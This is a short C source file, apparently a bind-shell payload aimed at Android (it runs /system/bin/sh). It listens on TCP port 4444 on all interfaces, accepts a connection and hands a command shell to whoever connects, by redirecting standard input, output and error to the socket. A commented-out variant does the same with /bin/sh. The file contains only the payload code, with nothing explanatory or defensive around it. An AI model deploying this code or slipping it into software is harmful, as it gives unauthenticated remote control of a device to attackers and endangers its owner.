#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char ** argv)
{
	int sockfd,new_sockfd;
	struct sockaddr_in host_addr, client_addr;
	socklen_t sin_size;
	
	sockfd = socket(PF_INET,SOCK_STREAM,0);
	
	host_addr.sin_family = AF_INET;
	host_addr.sin_port = htons(4444);
	host_addr.sin_addr.s_addr = INADDR_ANY;
	memset(&(host_addr.sin_zero), 0x0, 8);
	
	bind(sockfd,(struct sockaddr *)&host_addr, sizeof(struct sockaddr));
	
	listen(sockfd, 4);
	
	sin_size = sizeof(struct sockaddr_in);
	new_sockfd = accept(sockfd,(struct sockaddr*)&client_addr, &sin_size);
	
	printf("connected\n");
	
	dup2(new_sockfd,0);
	dup2(new_sockfd,1);
	dup2(new_sockfd,2);
	
	/*
	char* arg[2];
	char* envp[1];
	arg[0] = "/bin/sh";
	arg[1] = NULL;
	envp[0] = NULL;
	execve("/bin/sh",arg,envp);
	*/
	
	char* arg[2];
	char* envp[2];
	arg[0] = "/system/bin/sh";
	arg[1] = NULL;
	envp[0] = "PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin";
	envp[1] = 1;
	execve("/system/bin/sh",arg,envp);
	
	shutdown(new_sockfd, SHUT_RDWR);
	
	
	
	return 0;
}
